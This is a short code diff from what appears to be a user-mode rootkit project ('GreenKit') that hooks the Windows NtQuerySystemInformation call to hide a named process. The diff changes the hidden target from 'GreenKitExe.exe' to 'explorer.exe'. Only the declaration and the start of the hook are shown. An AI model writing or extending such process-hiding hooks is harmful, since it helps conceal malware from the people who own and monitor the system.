@@ -3,7 +3,7 @@
 #include "NtQuerySystemInformation.h"
 #include "hooking.h"
 
-const wchar_t* m_ProcessToHide = L"GreenKitExe.exe";
+const wchar_t* m_ProcessToHide = L"explorer.exe";
 
 NTSTATUS WINAPI NewNtQuerySystemInformation(
     __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
